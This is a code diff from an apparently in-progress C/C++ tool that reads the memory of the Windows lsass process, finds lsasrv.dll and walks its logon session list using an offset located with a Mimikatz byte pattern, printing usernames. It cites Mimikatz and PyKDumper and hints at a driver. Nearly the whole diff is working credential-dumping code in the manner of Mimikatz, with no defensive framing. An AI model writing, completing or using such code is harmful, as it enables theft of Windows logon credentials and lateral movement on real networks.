@@ -191,8 +191,7 @@ bool findLsasrv(HANDLE hTarget, PEB peb, PVOID* pTargetModuleBase) {
 	// 4) Compute remote address of list head (InMemoryOrderModuleList)
 	//    and read the head LIST_ENTRY
 	const BYTE* remoteLdrBase = (const BYTE*)peb.Ldr;
-	const BYTE* remoteHeadAddr = remoteLdrBase +
-		offsetof(PEB_LDR_DATA, InMemoryOrderModuleList);
+	const BYTE* remoteHeadAddr = remoteLdrBase + offsetof(PEB_LDR_DATA, InMemoryOrderModuleList);
 
 	LIST_ENTRY headLE = { 0 };
 	if (!ReadProcessMemory(hTarget, remoteHeadAddr, &headLE, sizeof(headLE), NULL)) {
@@ -274,6 +273,79 @@ bool locatePEB(HANDLE hTarget,PVOID* pPEB) {
 	return true;
 }
 
+PLIST_ENTRY LogonSessionList;
+PULONG LogonSessionListCount;
+
+typedef struct _LSA_LOGON_SESSION {
+	LIST_ENTRY ListEntry;     // 0x0
+	char padding[0x90 - sizeof(LIST_ENTRY)]; // pad up to 0x90
+	UNICODE_STRING UserName;  // 0x90
+	UNICODE_STRING Domain;    // 0xa0
+} LSA_LOGON_SESSION;
+
+
+
+
+bool findLogonSessionList(HANDLE hTarget, HMODULE hLsasrv) {
+	printf("Entered\n");
+	PVOID logonListHeadAddr = (PBYTE)hLsasrv + 0x000000000006e384;  // base addr + offset found in windbg 
+	//by seasrching for byte sequence found on github source of mim for 
+	//BYTE PTRN_WN1803_LogonSessionList[] = {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
+	printf("Logon list offset\n");
+
+	//https://github.com/uf0o/PykDumper/blob/master/PyKDumper/PyKDumper3.py
+	//According to this the list begins at logonLiastAddr + 0x90 = username, +0xa0 = domain
+	LIST_ENTRY headLE = { 0 };
+	if (!ReadProcessMemory(hTarget, logonListHeadAddr, &headLE, sizeof(headLE), NULL)) {
+		printf("headLE error...\n");
+		return false;
+	}
+	printf("retrieved remote head entry addr\n");
+
+	// 5) Iterate: remoteCurrent points to a remote LIST_ENTRY
+	PLIST_ENTRY remoteCurrentAddr = headLE.Flink;
+
+
+	PVOID remoteHeadAddr = (PLIST_ENTRY)logonListHeadAddr;
+	printf("Out of while loops\n");
+	while (remoteCurrentAddr != (PLIST_ENTRY)remoteHeadAddr) {
+		// Read the current remote LIST_ENTRY
+		LIST_ENTRY curLE = { 0 };
+		if (!ReadProcessMemory(hTarget, remoteCurrentAddr, &curLE, sizeof(curLE), NULL)) {
+			printf("Error retrieving list entry\n");
+			return false;
+		}
+
+		BYTE* entryBase = (BYTE*)remoteCurrentAddr - offsetof(LSA_LOGON_SESSION, ListEntry); //i have no idea why
+
+		//this addr is also the beginning of this lls entry.
+		LSA_LOGON_SESSION curLLS = { 0 };
+		if (!ReadProcessMemory(hTarget, entryBase, &curLLS, sizeof(curLLS), NULL)) {
+			printf("Error retrieving list lsa logon session list\n");
+			return false;
+		}
+
+		if (curLLS.UserName.Length > 0 && curLLS.UserName.Buffer) {
+			SIZE_T bytesRead = 0;
+			PWSTR username = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
+				curLLS.UserName.Length + sizeof(WCHAR));
+			if (username) {
+				if (ReadProcessMemory(hTarget,
+					curLLS.UserName.Buffer,
+					username,
+					curLLS.UserName.Length,
+					&bytesRead)) {
+					wprintf(L"Username: %s\n", username);
+				}
+				HeapFree(GetProcessHeap(), 0, username);
+			}
+		}
+
+		remoteCurrentAddr = curLE.Flink;
+	}
+	return true;
+}
+
 int main(int argc, wchar_t* argv[]) {
 	//Driver stuf...
 
@@ -327,6 +399,17 @@ int main(int argc, wchar_t* argv[]) {
 	PVOID pLsasrv = NULL;
 	printf("Outside NTLM\n");
 	findLsasrv(hTarget, pLocalPEBofRemotePEB, &pLsasrv);
+	HMODULE hLsasrv = NULL;
+	SIZE_T sLsasrv;
+	if (!ReadProcessMemory(hTarget, pLsasrv, &hLsasrv, sizeof(HMODULE), &sLsasrv)) {
+		printf("Error reading lsasrv.dll from lsass...\n");
+	}
+
+	printf("Finding logon session list...\n");
+	if (!findLogonSessionList(hTarget, hLsasrv)) {
+		printf("logonsselist erro");
+	}
+	
 
 	std::cout << "Hello world\n";
 
